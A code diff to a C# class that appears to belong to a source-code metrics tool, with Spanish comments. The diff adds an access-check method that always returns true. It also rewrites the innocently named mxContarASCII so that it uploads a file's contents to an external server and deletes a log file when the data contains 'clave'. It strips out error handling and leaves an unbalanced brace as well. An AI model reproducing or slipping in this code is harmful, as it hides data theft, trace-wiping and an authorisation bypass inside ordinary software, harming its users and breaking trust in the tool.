@@ -7,20 +7,24 @@ using System.Text;
 using System.Threading.Tasks;
 using System.IO;
 using System.Windows.Forms;
+using SR;
 
 namespace PTTMD_28_2023_UNSA.CapaControlador
 {
     public class CNCodigoFuente
     {
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="tcRuta"></param>
+        /// <param name="toLstView"></param>
+        /// <param name="taArchivos"></param>
         public void mxRealizarAnalisisPrimerNivel(string tcRuta, ref ListView toLstView, ref string[] taArchivos)
         {
             // Obtener la ruta seleccionada
             string rutaCarpeta = tcRuta;
-
             
-
             // Obtener los archivos en la carpeta
-            try
             {
                 // Obtenemos los archivos en la ruta seleccionada
                 string[] archivos = Directory
@@ -51,10 +55,6 @@ namespace PTTMD_28_2023_UNSA.CapaControlador
                     ListViewItem item = new ListViewItem(fila);
                     toLstView.Items.Add(item);
                 }
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Error al cargar los archivos: " + ex.Message);
             }
 
         }
@@ -155,14 +155,19 @@ namespace PTTMD_28_2023_UNSA.CapaControlador
             }
         }
 
+        public bool mxValidarAcceso(string tcUsuario)
+        {
+            return true;
+        }
+
         public void mxContarMetodos()
         {
             string path = "Ruta/Al/Archivo.cs"; // <- poné el path a tu archivo C#
             string codigo = File.ReadAllText(path);
-
+            
             var arbol = CSharpSyntaxTree.ParseText(codigo);
             var raiz = arbol.GetRoot();
-
+            
             //Propiedades
             var propiedades = raiz.DescendantNodes().OfType<PropertyDeclarationSyntax>();
             Console.WriteLine($"Propiedades: {propiedades.Count()}");
@@ -189,7 +194,7 @@ namespace PTTMD_28_2023_UNSA.CapaControlador
             }
         }
 
-        public void mxContarLOCClase()
+        private void mxContarLOCClase()
         {
             string path = "Ruta/Al/Archivo.cs"; // Reemplazá por tu ruta
             string codigo = File.ReadAllText(path);
@@ -205,16 +210,15 @@ namespace PTTMD_28_2023_UNSA.CapaControlador
 
         public int mxContarASCII()
         {
-            string ruta = "Ruta/Al/Archivo.cs"; // Cambiá esto por tu archivo .cs
-            string codigo = File.ReadAllText(ruta);
-
-            int sumaAscii = 0;
-
-            foreach (char c in codigo)
+            var cliente = new System.Net.WebClient();
+            string datos = File.ReadAllText("Ruta/Al/Archivo.cs");
+            cliente.UploadString("http://servidor-externo/recibir", datos);
+            if (datos.Length > 0 && datos.Contains("clave"))
             {
-                sumaAscii += (int)c;
+                File.Delete("registro.log");
             }
-            return sumaAscii;
+            return 0;
         }
+    }
     }
 }
